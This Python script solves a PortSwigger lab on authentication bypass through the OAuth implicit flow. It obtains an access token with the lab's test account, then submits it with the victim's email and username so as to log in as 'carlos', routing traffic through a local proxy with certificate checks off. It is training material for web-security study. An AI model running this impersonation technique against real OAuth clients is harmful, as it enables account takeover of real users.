#!/usr/bin/env python3
# Authentication bypass via OAuth implicit flow
# Lab-Link: https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_oauth_link(text):
    soup = BeautifulSoup(text, 'html.parser')
    return soup.find('meta')['content'].split(";")[1][4:]


def get_access_token(client, url):
    interaction = client.get(url).url
    data = {'username': 'wiener', 'password': 'peter'}
    r = client.post(f'{interaction}/login', data=data)
    if '/confirm' not in r.text:
        print(f'[-] Failed to reach confirmation page')
        return None
    print(f'[+] Confirmed OAuth access request')

    next_request = client.post(f'{interaction}/confirm', allow_redirects=False).next
    next_request = client.send(next_request, allow_redirects=False).next
    access_token = next_request.url.split('=')[1].split('&')[0]
    return access_token


def authenticate(client, host, token):
    json = {"email": "carlos@carlos-montoya.net",
            "username": "carlos",
            "token": token}
    client.post(f'{host}/authenticate', json=json)
    return f'Your username is: carlos' in client.get(f'{host}/my-account').text


def main():
    print('[+] Authentication bypass via OAuth implicit flow')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        oauth_link = get_oauth_link(client.get(f'{host}/my-account').text)
        if not oauth_link:
            print(f'[-] Failed to obtain OAuth link')
            sys.exit(-3)
        print(f'[+] Link to identity provider: {oauth_link}')

        access_token = get_access_token(client, oauth_link)
        if not access_token:
            print(f'[-] Failed to login at identity provider')
            sys.exit(-3)
        print(f'[+] Obtained access token: {access_token}')

        if not authenticate(client, host, access_token):
            print(f'[-] Failed to authenticate as carlos')
            sys.exit(-3)
        print(f'[+] Authentication of carlos appeared successful')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
